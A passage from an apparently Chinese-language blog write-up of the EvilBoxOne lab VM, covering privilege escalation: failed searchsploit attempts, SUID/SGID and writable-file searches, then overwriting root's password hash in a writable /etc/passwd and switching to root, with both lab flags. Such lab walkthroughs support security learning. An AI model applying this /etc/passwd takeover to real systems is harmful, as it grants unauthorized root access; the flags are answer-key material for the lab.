+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 4.19 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211208235652875.png" alt="image-20211208235652875"></p>
+<p>几番尝试后 都失败了…..裂开……😭</p>
+<h4 id="4-利用find-suid"><a href="#4-利用find-suid" class="headerlink" title="4)利用find suid"></a>4)利用find suid</h4><p>寻找这台靶机上的哪些程序&#x2F;可执行文件是具有suid权限且属主是root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null</span><br><span class="line">#4000即为suid权限</span><br><span class="line">#因为是从/根目录搜索的所有即搜索整台靶机上的程序 可能因权限不足会存在报错 为了方便看到成功信息 将错误信息定向到/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209000653290.png" alt="image-20211209000653290"></p>
+<p>结果很遗憾这些可执行文件都是系统默认的 即是安全的 没能够找到突破的点</p>
+<h4 id="5-利用find-sgid"><a href="#5-利用find-sgid" class="headerlink" title="5)利用find sgid"></a>5)利用find sgid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /2000 2&gt;/dev/null</span><br><span class="line">#2000即为sgid权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209001212656.png" alt="image-20211209001212656"></p>
+<p>依然是默认的..很安全..</p>
+<h4 id="6-寻找系统中可写的文件"><a href="#6-寻找系统中可写的文件" class="headerlink" title="6)寻找系统中可写的文件"></a>6)寻找系统中可写的文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>mowree@EvilBoxOne:~$ find &#x2F; -writable 2&gt;&#x2F;dev&#x2F;null | grep -v proc<br>&#x2F;tmp<br>&#x2F;tmp&#x2F;.ICE-unix<br>&#x2F;tmp&#x2F;.X11-unix<br>&#x2F;tmp&#x2F;.Test-unix<br>&#x2F;tmp&#x2F;.font-unix<br>&#x2F;tmp&#x2F;.XIM-unix<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.null<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.remove<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.replace<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.load<br>&#x2F;sys&#x2F;kernel&#x2F;security&#x2F;apparmor&#x2F;.access<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#101;&#114;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;session-14.scope&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;user.slice&#x2F;user-1000.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;apache2.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-udevd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-disk-by\x2duuid-635c225b\x2d1f26\x2d4d4e\x2d912a\x2d87db360ddbb1.swap&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cron.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;sys-kernel-debug.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-journald.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;ssh.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-mqueue.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;rsyslog.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;<a href="mailto:&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;">&#x69;&#102;&#117;&#x70;&#64;&#x65;&#110;&#x70;&#x30;&#115;&#51;&#46;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dev-hugepages.mount&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;dbus.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-timesyncd.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;<a href="mailto:&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;">&#x67;&#x65;&#116;&#x74;&#121;&#x40;&#116;&#x74;&#121;&#49;&#x2e;&#x73;&#101;&#x72;&#x76;&#105;&#x63;&#101;</a>&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;system-getty.slice&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;memory&#x2F;system.slice&#x2F;systemd-logind.service&#x2F;cgroup.event_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#117;&#115;&#x65;&#114;&#64;&#49;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#x73;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#118;&#x69;&#99;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;">&#117;&#x73;&#x65;&#114;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#99;&#x65;</a>&#x2F;init.scope&#x2F;tasks<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;notify_on_release<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;">&#x75;&#x73;&#101;&#114;&#x40;&#49;&#x30;&#x30;&#x30;&#x2e;&#x73;&#101;&#x72;&#118;&#105;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;systemd&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#x75;&#x73;&#x65;&#x72;&#x40;&#49;&#x30;&#48;&#48;&#x2e;&#x73;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;cgroup.clone_children<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;">&#117;&#115;&#x65;&#x72;&#x40;&#x31;&#x30;&#48;&#x30;&#46;&#x73;&#x65;&#114;&#x76;&#x69;&#x63;&#x65;</a><br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;">&#x75;&#115;&#101;&#x72;&#x40;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#99;&#x65;</a>&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;">&#x75;&#115;&#x65;&#114;&#x40;&#49;&#48;&#48;&#48;&#x2e;&#115;&#101;&#114;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;">&#117;&#115;&#101;&#x72;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#114;&#x76;&#105;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.descendants<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;">&#x75;&#x73;&#101;&#114;&#x40;&#x31;&#48;&#48;&#48;&#46;&#115;&#101;&#x72;&#x76;&#x69;&#99;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.type<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#x30;&#x30;&#48;&#46;&#115;&#x65;&#114;&#118;&#105;&#99;&#101;</a>&#x2F;init.scope&#x2F;cgroup.threads<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;">&#117;&#115;&#x65;&#114;&#64;&#x31;&#x30;&#x30;&#x30;&#x2e;&#115;&#101;&#x72;&#118;&#x69;&#x63;&#101;</a>&#x2F;init.scope&#x2F;cgroup.subtree_control<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;">&#117;&#x73;&#101;&#x72;&#64;&#49;&#48;&#48;&#48;&#46;&#x73;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;</a>&#x2F;init.scope&#x2F;cgroup.max.depth<br>&#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;unified&#x2F;user.slice&#x2F;user-1000.slice&#x2F;<a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;">&#117;&#115;&#x65;&#114;&#x40;&#49;&#x30;&#x30;&#48;&#x2e;&#115;&#101;&#x72;&#118;&#105;&#x63;&#x65;</a>&#x2F;cgroup.subtree_control<br>&#x2F;run&#x2F;dbus&#x2F;system_bus_socket<br>&#x2F;run&#x2F;user&#x2F;1000<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;shm<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;dev-log<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;syslog<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;socket<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;stdout<br>&#x2F;run&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;lock<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2fseq<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2ftimer<br>&#x2F;home&#x2F;mowree<br>&#x2F;home&#x2F;mowree&#x2F;.profile<br>&#x2F;home&#x2F;mowree&#x2F;.bash_history<br>&#x2F;home&#x2F;mowree&#x2F;.ssh<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;home&#x2F;mowree&#x2F;.bashrc<br>&#x2F;home&#x2F;mowree&#x2F;.bash_logout<br>&#x2F;home&#x2F;mowree&#x2F;.local<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share&#x2F;nano<br><strong>&#x2F;etc&#x2F;passwd</strong>                     #咦❓<br>&#x2F;dev&#x2F;dvd<br>&#x2F;dev&#x2F;cdrom<br>&#x2F;dev&#x2F;fb0<br>&#x2F;dev&#x2F;dri&#x2F;by-path&#x2F;pci-0000:00:02.0-card<br>&#x2F;dev&#x2F;dri&#x2F;card0<br>&#x2F;dev&#x2F;sg1<br>&#x2F;dev&#x2F;snd&#x2F;seq<br>&#x2F;dev&#x2F;snd&#x2F;timer<br>&#x2F;dev&#x2F;net&#x2F;tun<br>&#x2F;dev&#x2F;fuse<br>&#x2F;dev&#x2F;log<br>&#x2F;dev&#x2F;mqueue<br>&#x2F;dev&#x2F;shm<br>&#x2F;dev&#x2F;disk&#x2F;by-id&#x2F;ata-VBOX_CD-ROM_VB2-01700376<br>&#x2F;dev&#x2F;disk&#x2F;by-path&#x2F;pci-0000:00:01.1-ata-2<br>&#x2F;dev&#x2F;block&#x2F;11:0<br>&#x2F;dev&#x2F;sr0<br>&#x2F;dev&#x2F;char&#x2F;29:0<br>&#x2F;dev&#x2F;char&#x2F;226:0<br>&#x2F;dev&#x2F;char&#x2F;21:1<br>&#x2F;dev&#x2F;char&#x2F;5:0<br>&#x2F;dev&#x2F;char&#x2F;5:2<br>&#x2F;dev&#x2F;char&#x2F;1:5<br>&#x2F;dev&#x2F;char&#x2F;1:9<br>&#x2F;dev&#x2F;char&#x2F;1:8<br>&#x2F;dev&#x2F;char&#x2F;1:3<br>&#x2F;dev&#x2F;char&#x2F;1:7<br>&#x2F;dev&#x2F;stderr<br>&#x2F;dev&#x2F;stdout<br>&#x2F;dev&#x2F;stdin<br>&#x2F;dev&#x2F;fd<br>&#x2F;dev&#x2F;pts&#x2F;0<br>&#x2F;dev&#x2F;ptmx<br>&#x2F;dev&#x2F;tty<br>&#x2F;dev&#x2F;urandom<br>&#x2F;dev&#x2F;random<br>&#x2F;dev&#x2F;full<br>&#x2F;dev&#x2F;zero<br>&#x2F;dev&#x2F;null<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;sendsigs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootmisc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountdevsubfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rmnologin.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;motd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;reboot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rcS.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostname.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd-single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks-early.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountkernfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;halt.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hwclock.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;x11-common.service<br>&#x2F;var&#x2F;tmp<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;var&#x2F;lock</p>
+</blockquote>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002251743.png" alt="image-20211209002251743"></p>
+<p>发现&#x2F;etc&#x2F;passwd竟然是可写的</p>
+<p>这里通过查看kali本机的&#x2F;etc&#x2F;passwd权限 对比一下此处的异常</p>
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209002654265.png" alt="image-20211209002654265"></p>
+<p>而目标靶机上的用户mowree居然具有&#x2F;etc&#x2F;passwd文件的写权限 突破的一线曙光🌞</p>
+<p>linux系统内的用户名存放在&#x2F;etc&#x2F;passwd文件内，密码存放在&#x2F;etc&#x2F;shadow文件内，但是&#x2F;etc&#x2F;shadow文件没有权限，所以下一步的思路是借助已有的对&#x2F;etc&#x2F;passwd的写权限，能否修改root密码？</p>
+<p>给root账号生成密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1   #-1 md5加密算法代号      设定密码123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209004130358.png" alt="image-20211209004130358"></p>
+<p>复制密文$1$oSFKywfc$hOVlE.SmqSlT5aAhNHQsS1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd        #修改root用户的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005157113.png" alt="image-20211209005157113"></p>
+<p>更改成功后</p>
+<p>切换至root用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/byesec/picture/raw/master/6/image-20211209005326964.png" alt="image-20211209005326964"></p>
+<p>提权成功，拿到第二个flag 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+<p>🏆flag1</p>
+<blockquote>
+<p>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</blockquote>
+<p>🏆flag2</p>
+<blockquote>
+<p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</blockquote>
+</div></article></div></main><footer><div class="paginator"><a href="/2022/04/12/week1/" class="next">NEXT</a></div><div class="copyright"><p>© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>
